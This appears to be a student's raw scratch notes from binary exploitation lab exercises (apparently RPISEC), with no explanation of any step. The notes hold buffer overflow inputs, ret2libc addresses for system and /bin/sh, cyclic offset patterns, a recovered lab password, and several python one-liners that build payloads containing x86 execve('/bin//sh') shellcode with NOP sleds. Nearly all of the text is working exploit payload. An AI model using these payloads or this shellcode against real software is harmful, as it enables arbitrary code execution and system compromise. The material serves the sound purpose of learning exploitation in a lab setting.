
esp_plus_20 = 0x0

stored_password = "kw6PZq3Zd;ekR[_1"

gfff = 0x66666667

eax = esp_plus_20 + stored_password

ebx = eax[0]

ecx = esp_plus_20 + 0x1

edx = gfff


imul = ecx*edx




AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBB
print(hex(imul))


0xf7e2d200

\x00\xd2\xe2\xf7  #system

0xf7f6e0cf

\xcf\xe0\xf6\xf7  #/bin/sh

\xcf\xe0\xf6\xf7\x00\xd2\xe2\xf7 


python -c "print 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\xd2\xe2\xf7\xcf\xe0\xf6\xf7\n'" > input



python -c "print 'AAAAAAAAAAA\x00\xd2\xe2\xf7\xcf\xe0\xf6\xf7\nA\nA\nA\nA\nA\nA\nA\nA\nA\nA\nA\nA\nA\nA\nA\nA\nA\nA'" > input



xU


57b9

57A5

\xa5\x57
\x57\x69

python -c "print 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa\x69YTbLLLcllldRRR\x57DDD'" > input



python -c "print 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADDDD'" > input

0x5655577d


\x7d\x57\x55\x56
python -c "print 'AAAAAAAAAAAA\nA\nA\nA\nA\nA\nA\nA\nA\nA\nA\nA\nA\nA\nA\nA\nA\nA\nA\nA\nA\nA\nA\nA\n\x7d\x57\x55\x56\n'" > input



agaa

aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab

0x5655574d

\x4d\x57\x55\x56

aaaabaaacaaadaaaeaaafaaagaa\x4d\x57\x55\x56


rpisec\naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa\x1c\x57\x55\x56\n


0x5655571c


\x1c\x57\x55\x56

aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa\x1c\x57\x55\x56vaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab



aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaavWUVaaawaaaxaaay\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80


\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80


aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaavWUVaaawaaaxaaayansdakndasdjkansdkanskdsankjdankdnajsdnaskdjnaskdjnaskdasdasdasddadasdnjkdasndkansdkjanakjndekjnkdjakndkjsa


aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaavWUV\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80

FFFFD720


\x20\xd7\xff\xff


ffffd71c


0xffffd6a4

0xffffd6a4

\xa4\xd6\xff\xff

0xffffd6a8

\xa8\xd6\xff\xff

0xffffd6ac

\xac\xd6\xff\xff

0xffffd6b0

\xb0\xd6\xff\xff

0xffffd6b4

\xb4\xd6\xff\xff




(python -c 'print "\x90"*80 +"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90"*20 +"\x20\xd7\xff\xff\xa8\xd6\xff\xff\xac\xd6\xff\xff\xb0\xd6\xff\xff\xb4\xd6\xff\xff"') > injinput







0xffffd6bc


\xbc\xd6\xff\xff

\xff\xff\xd6\xbc

(python -c 'print "rpisec\n" + "\x90"*50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xff\xff\x18\xd7\xff\xff\xc0\xd6\xff\xff\xc4\xd6\xff\xff\xc8\xd6\xff\xff\xcc\xd6"') > input

											




(python -c 'print "rpisec\n" + "\x90"*30 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*23 + "\xff\xff\x18\xd7\xff\xff\xc0\xd6\xff\xff\xc4\xd6\xff\xff\xc8\xd6\xff\xff\xcc\xd6\n"') > input
